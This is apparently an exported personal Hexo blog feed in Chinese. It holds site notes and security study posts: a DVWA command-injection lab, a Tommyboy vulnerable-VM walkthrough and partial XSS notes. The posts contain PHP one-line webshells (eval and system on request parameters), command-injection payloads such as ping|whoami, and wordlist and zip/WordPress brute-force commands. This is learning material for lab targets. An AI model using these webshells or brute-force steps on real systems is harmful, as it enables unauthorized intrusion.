    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑小提示</title>
    <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean<br>npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean<br>hexo g<br>gulp<br>hexo d</code><br>来优化网页</p>
</body></html>]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>要置顶的公告</title>
    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"><br>2024/3/22 更新:<br>因为备考所以很很很很很很忙<br>更新速度多有降低 见谅</p>
<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
<p>ps:<br>typora的单格换行是<strong>shift+enter</strong> 双格换行才是<strong>enter</strong> 请注意<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong><br>无渲染跳转方式: 在文章前加入</p>
<pre class="line-numbers language-none"><code class="language-none">---
layout: false 
--- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>总感觉kook（撤去一堆控诉他是个怎么抄袭了discord的卑鄙无耻的软件的言论）马上得暴死了<br>Todolist估计得换一个位置 这里不行 得是<strong>方便修改增加编辑内容</strong>的平台<br>一句话木马官方老师手打版本<br><code>&lt;?php  eval($_POST[123]);?&gt;</code></p>
</body></html>]]></content>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp命令执行漏洞</title>
    <url>/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 好的那么今天我们来讲命令执行漏洞<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a><br><strong>命令执行漏洞</strong> 一般指的是网站中有程序可以运行命令行指令<br>但忘记过滤 <strong>&amp;&amp; &amp; | || ;</strong> 等字符 使得恶意代码可以被允许运行的漏洞</p>
<span id="more"></span>

<blockquote>
<p>WINDOWS系统支持的管道符<br>“|”：直接执行后面的语句<br>例如：<code>ping www.baidu.com|whoami</code><br>“||”：如果前面执行的语句执行出错，则执行后面的语句<br>例如：<code>ping www.baidu.com||whoami</code><br>“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假<br>例如：<code>ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami</code><br>“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句<br>例如：<code>ping www.baidu.com&amp;&amp;whoami ping www.baidu.com&amp;&amp;whoami</code><br>LINUX系统支持的管道符<br>“；”执行完前面的命令执行后面的<br>“|”：显示后面语句的执行结果<br>“||”：当前面的语句执行出错时，执行后面的语句<br>“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假<br>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<br>————————————————<br>版权声明：本文为CSDN博主「H3rmesk1t」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/117349106">https://blog.csdn.net/LYJ20010728/article/details/117349106</a></p>
</blockquote>
<p>169.254.x.x 受限地址 微软自己买下来的一段地址 一般是检测系统是否为windows的</p>
<h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1）低等级"><a href="#1）低等级" class="headerlink" title="1）低等级"></a>1）低等级</h2><p><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"><br>查看网站源码 发现没有做过多限制<br>直接进行漏洞利用<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.jpg" alt="2.jpg"></p>
<h2 id="2-中级别"><a href="#2-中级别" class="headerlink" title="2).中级别"></a>2).中级别</h2><p>首先查看源码<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg" alt="3.jpg"><br>可以看出它限制了 <strong>&amp;&amp;</strong> 与 <strong>;</strong> 会将它们替换为空格<br>那就很方便 使用 <strong>|</strong> 与其他的字符来绕过即可<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.jpg" alt="4.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之Tommyboy1dot0</title>
    <url>/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p> 总之这是今天的靶机</p>
<h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><p>攻击机：kali（192.168.246.128）<br>• <strong>工具：</strong><br>nmap（端口扫描）<br>dirbuster（目录爆破）<br>crunch（密码表生成）<br>fcrackzip （压缩包爆破）<br>wpscan （扫描/爆破wordpress）</p>
<p>• <strong>知识点：</strong><br>   1、信息泄露<br>   2、md5解密<br>   3、命令执行</p>
<span id="more"></span>

<h1 id="获取过程"><a href="#获取过程" class="headerlink" title="获取过程"></a>获取过程</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/1.jpg" alt="1"><br>国际惯例 先arp-scan 发现同网段的设备<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/2.jpg" alt="2"><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/6.jpg" alt="6"></p>
<blockquote>
<p><strong>-sC ：根据端口识别的服务，调用默认脚本 。</strong></p>
</blockquote>
<p>我们借用nmap的-sC附加项 发现80端口存在四个<strong>防止爬虫进入的目录</strong></p>
<blockquote>
<h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p>
<ul>
<li>不要访问某个文件、文件夹</li>
<li>禁止某些爬虫的访问</li>
<li>限制爬虫访问网站的频率</li>
</ul>
<p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p>
</blockquote>
<p>依次进入 发现flag-numero-uno.txt目录下存在第一个flag信息<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/7.jpg" alt="7"><br>按他的描述 <strong>存在五个flag碎片</strong> 我们需要集齐它们来获取最终的宝藏</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>firefox访问80端口<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/3.jpg" alt="3"><br>f12发现隐藏注释<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/4.jpg" alt="4"><br>翻译大意为<strong>线索在这段youtube视频之中</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/5.jpg" alt="5"><br>访问查看 全文就一句 <strong>“hey prehistoricforest”</strong><br>我们尝试 **/prehistoricforest/**目录<br>访问发现是个公司博客<br>我们查看其中的文章与评论获取线索<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/8.jpg" alt="8"><br>发现了flag2的线索：thisisthesecondflagyayyou.txt<br>往目录中输入查看<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/9.jpg" alt="9"><br>成功获取第二个flag</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/10.jpg" alt="10"><br>博客的前两篇相互关联<br>一篇是加密的 无法访问<br>而另一篇则是在询问该加密博客的密码<br>我们查看该博客来寻找线索<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/11.jpg" alt="11"><br>提示提到我们要删去目录中的 <strong>prehistoricforest</strong> 换上 <strong>richard</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/12.jpg" alt="12"><br>发现了一张图片 我们保存下来<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/13.jpg" alt="13"><br>使用<strong>strings</strong>工具查看是否存在图片隐写<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/14.jpg" alt="14"><br>可以看出其中潜藏了一段md5码<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/15.jpg" alt="15"><br>解密结果为<strong>spanky</strong><br>看来spanky就是加密博客的密码<br>我们输入 访问<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/16.jpg" alt="16"><br>博客大致翻译如上<br>那么我们知道了<br>1.ftp服务器不咋稳定 每15分钟会开机关机循环<br>2.ftp有个名为<strong>nickburns</strong>的账户 密码很好猜<br>3.ftp在一个不寻常的端口上运行<br>我们ftp尝试链接<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/17.jpg" alt="17"><br>ps：这里省略了等待+nmap扫描端口后发现65534的过程<br>总之我们发现了一个名为readme.txt的文件<br>获取后开启<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/18.jpg" alt="18"><br>内容大意如下<br>按照他的意思 我们访问NickIzL33t目录<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/19.jpg" alt="19"><br>网站说只有他和史蒂夫乔布斯(苹果公司创始人)可以看到其中的内容<br>那看来是需要以iphone的身份来进入<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/20.jpg" alt="20"><br>我们去firefox的插件商城下个更改身份的插件(关键词<strong>User Agent Switcher</strong>)<br>安装完更改身份 刷新网页<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/21.jpg" alt="21"><br>他说我通过了第一个考验 但真正的内容需要我输入准确的.html目录<br>那就使用目录爆破工具<strong>dirbuster</strong>来扫描<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/22.jpg" alt="22"><br>ps:需要在<strong>options-advance options</strong>中将<strong>user agent(请求头)<strong>改为iphone 把</strong>file extension</strong>改为html<br>线程能拉多大拉多大 是为了加速出结果</p>
<blockquote>
<p>示意图:</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/24.png" alt="24"></p>
<p>待解决的问题：dirbuster报错20次会自动停止需要手动继续开始 目前没有找到解决方法</p>
</blockquote>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/23.jpg" alt="23"><br>得到结果fallon1.html 我们访问<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/24.jpg" alt="24"><br>获得 <strong>一个提示 flag3与pw备份</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/25.jpg" alt="25"></p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p><strong>pw备份</strong>是个压缩包 我们暂且保存下来<br>发现需要密码<br>那我们看看提示有没有提供什么有用的</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/26.jpg" alt="26"><br>他告诉了我们密码的组成成分 而我们可以<strong>利用这点生成一个密码表</strong><br>通过搜索了解Tommy Boy上映于1995年<br>也就是说 密码为<code>bev[一个大写字符][两个数字][两个小写字符][一个符号]1995</code> 一共十三个字符<br>我们利用<strong>crunch</strong>工具生成密码表</p>
<blockquote>
<p>crunch使用指南</p>
<pre class="line-numbers language-none"><code class="language-none">crunch &lt;min-len&gt;  &lt;max-len&gt;  [&lt;charset string&gt;] [options]
-t     指定密码输出的格式
-o     将密码保存到指定文件

特殊字符，通常与-t配合使用
%      代表数字
^      代表特殊符号
@      代表小写字符
,      代表大写字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>这里按我们所需要的密码来输入命令</p>
<p><code>crunch 13 13 -t bev,%%@@^1995 -o password.txt</code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/27.jpg" alt="27"><br>生成完毕了<br>我们再利用<strong>fcrackzip</strong>工具来爆破压缩包</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/28.jpg" alt="28"><br>先安装一下</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">fcrackzip -v -D -u -p [密码文件] [zip文件]
-v 更详细
-D 使用字典
-u 使用unzip清除错误密码
-p 密码文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>输入<code>fcrackzip -v -D -u -p password.txt t0msp4ssw0rdz.zip</code></p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/29.jpg" alt="29"><br>得到结果<strong>pw == bevH00tr$1995</strong><br>解压获得<strong>passwords.txt</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/30.jpg" alt="30"><br>查看 发现四个密码 其中俩不完整<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/31.jpg" alt="31"><br><strong>bigtommysenior</strong>的密码提示：密码为<strong>fatguyinalittlecoat</strong>后面加了点数字 但是他忘了是啥 提示在公司博客中<br><strong>bigtom</strong>(他连账号都不是很确定)的密码提示：和皇后乐队的一首有名歌曲有联系<br>既然公司博客的类型是<strong>wordpress</strong> 那我们就需要用到<strong>wpscan</strong>工具了</p>
<blockquote>
<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p>
<pre class="line-numbers language-常用选项" data-language="常用选项"><code class="language-常用选项">&gt;--update  更新到最新版本
&gt;--url   | -u &lt;target url&gt;  要扫描的`WordPress`站点.
&gt;--force | -f   不检查网站运行的是不是`WordPress`
&gt;--enumerate | -e [option(s)]  枚举
&gt;u 枚举用户名，默认从1-10
&gt;u[10-20] 枚举用户名，配置从10-20
&gt;--username | -U &lt;username指定爆破的用户名
&gt;--wordlist | -w &lt;wordlist指定密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>我们输入指令<code>wpscan --url "http://192.168.246.136/prehistoricforest/" -e u   </code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/32.jpg" alt="32"><br>发现存在用户tom<br>那就指定爆破用户tom的密码<br><code>wpscan --url http://192![33](/33.jpg).168.246.136/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt -U tom</code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/33.jpg" alt="33"><br>结果得出tom的密码为<strong>tomtom1</strong><br>我们利用这套账号密码登录公司wordpress博客的后台<br><img data-src="/34.jpg" alt="34"><br>里面有个未发布的文章 内容是之前提到的<strong>fatguyinalittlecoat</strong>后的数字<br>于是我们得出<br><strong>bigtommysenior</strong>的密码为<strong>fatguyinalittlecoat1938!!</strong></p>
<blockquote>
<p>坑：可能有点先入为主了 我试了好几遍fatguyinalittlecoat1938</p>
</blockquote>
<p>我们用这套账号密码登入该靶机的ssh服务</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/35.jpg" alt="35"><br>首先是获得了flag4 </p>
<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>根目录下的LOOT.ZIP有密码 暂且不管他<br>获得flag4的同时 它留下了提示:flag5位于服务器的**/.5.txt**中<br>但该文件需要root权限</p>
<p>那我们根据<strong>Linux的http网站的根目录一般都是/var/www/html</strong>来看看有没有之前破解过程中服务器中的<strong>NickIzL33t</strong></p>
<p>最终省略寻找过程 我们发现/<strong>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS</strong>下有一个开放权限的<strong>uploads</strong>文件夹<br>我们利用 <strong>文件上传漏洞</strong> 在其中创建一个文件<br><!--?php system($_GET['123']);?--><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/36.jpg" alt="36"></p>
<p>创建完毕 在firefox中利用木马<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/37.jpg" alt="37"><br>他给出了第五个flag 并叫我们<strong>将五个flag结合起来 作为密码解压LOOT.ZIP</strong></p>
<pre class="line-numbers language-none"><code class="language-none">flag1：B34rcl4ws
flag2：Z4l1nsky
flag3：TinyHead
flag4：EditButton
flag5：Buttcrack
结合起来就是B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>解压LOOT.ZIP 获得THE-END.txt</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/38.jpg" alt="38"><br>过关！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总过程4 5小时 是我目前做过过程最繁琐的靶机<br>配合了多个工具 需要对多个漏洞有充分了解才能解开<br>经过这次打靶认识了不少新玩意 同时也认识到了一些不足<br>希望可以活用到下一次</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>xss跨站点脚本攻击</title>
    <url>/2023/12/05/xss%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 总之这是今天的笔记</p>
<h2 id="什么是xss跨站点脚本攻击"><a href="#什么是xss跨站点脚本攻击" class="headerlink" title="什么是xss跨站点脚本攻击"></a>什么是xss跨站点脚本攻击</h2><p>XSS的原理和分类<br>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
<span id="more"></span>

<p>1.什么是Javascript<br>JavaScript是指在网页上编写的脚本语言，是对HTML在功能上的扩展。<br>JavaScript与Java没有任何关系，它们只是名字相似而已。<br>JavaScript的代码嵌入在HTML里，直接在客户端的浏览器上执行，属于前端语言。<br>大多数的XSS代码都是使用JavaScript语言编写的，JavaScript能做到什么效果，XSS的威力就有多大。<br>JavaScript自测<br><a href="https://www.w3school.com.cn/quiz/quiz.asp?quiz=js">https://www.w3school.com.cn/quiz/quiz.asp?quiz=js</a><br>JavaScript基础语法练习<br>搭建环境（WS2008+AppServ+Sublime）<br>例子1：JavaScript test</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	document.write("&lt;h1&gt;Hello,world")
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子2：JavaScript 变量</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript 变量&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	var name = "shuke";
	document.write("&lt;h1&gt;hello,"+ name)
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子3：JavaScript 字符串拼接</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;字符串拼接&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	var name = "leiyu";
	var age = 17;
	document.write("&lt;h1&gt;Hello,everyone! My name is " + name +". I'm " + age +" years old.");
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子4：JavaScript 事件响应</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript 事件响应&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;form action=""&gt;
		&lt;input type="button" value="请单击此处" onclick=alert('你单击了此按钮，触发了弹窗') &gt;
	&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子5：JavaScript OnError事件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;JavaScript OnError事件&lt;/title&gt;
&lt;/head&gt;
&lt;body onload=alert("客官，您久等了....")&gt;
	&lt;img src="./images/welcome.png" onerror=alert("请检查图片路径....")&gt;
&lt;/body&gt;
&lt;/html&gt;
加载外部js文件
jstest.html文件
&lt;script src="/js/test.js"&gt;&lt;/script&gt;
test.js文件
alert("hello,world!");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子6:加载外部文件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script src=“URL"&gt;&lt;/script&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;加载外部js文件&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script src="./js/test.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子7:加载外部文件document对象的常用属性:cookie,location</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;document对象的常用属性:cookie,location&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;script&gt;
	alert(document.cookie);
	alert(document.location);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>例子8:location.href实现页面跳转</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
